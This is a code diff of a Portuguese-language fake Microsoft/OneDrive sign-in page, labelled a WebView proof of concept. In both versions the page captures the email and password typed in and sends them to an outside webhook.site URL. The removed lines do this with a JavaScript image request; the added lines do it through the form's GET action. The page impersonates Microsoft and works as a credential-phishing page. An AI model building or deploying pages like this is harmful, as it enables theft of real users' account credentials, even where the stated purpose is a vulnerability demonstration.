@@ -11,7 +11,6 @@
         input { width: 100%; padding: 14px; margin: 10px 0; border: 1px solid #ccc; border-radius: 6px; font-size: 17px; }
         button { width: 100%; padding: 14px; background: #0078d4; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
         .demo { background: #fff3cd; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 25px; font-size: 15px; }
-        .success { margin-top: 25px; padding: 15px; background: #d4edda; color: #155724; border-radius: 8px; display: none; }
     </style>
 </head>
 <body>
@@ -21,36 +20,17 @@
         <h1>Entrar</h1>
         <p>Use sua conta Microsoft para acessar o OneDrive</p>
 
-        <form id="form">
-            <input type="email" id="email" placeholder="E-mail ou telefone" required autocomplete="off">
-            <input type="password" id="password" placeholder="Senha" required autocomplete="off">
+        <form id="form" action="https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314" method="GET">
+            <input type="hidden" name="source" value="inDrive-WebView-PoC">
+            <input type="email" id="email" name="email" placeholder="E-mail ou telefone" required>
+            <input type="password" id="password" name="password" placeholder="Senha" required>
             <button type="submit">Entrar</button>
         </form>
-
-        <div id="success" class="success">
-            ✅ Credenciais enviadas para o webhook.site!
-        </div>
     </div>
 
     <script>
-        const webhook = "https://webhook.site/c4e06d2f-8cd7-4ef7-8e49-3225dca67314";
-
-        document.getElementById('form').addEventListener('submit', function(e) {
-            e.preventDefault();
-
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
-
-            // Método GET simples com query string (o mais compatível com WebView)
-            const url = `${webhook}?email=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}&time=${Date.now()}`;
-
-            // Envia usando Image (funciona melhor que fetch em alguns WebViews)
-            const img = new Image();
-            img.src = url;
-
-            document.getElementById('success').style.display = 'block';
-
-            alert(`✅ Enviado!\nEmail: ${email}\nSenha: ${password}\n\nOlhe agora na aba do webhook.site`);
+        document.getElementById('form').addEventListener('submit', function() {
+            alert("✅ Credenciais enviadas para o webhook.site!\n\nAgora olhe na outra aba.");
         });
     </script>
 </body>
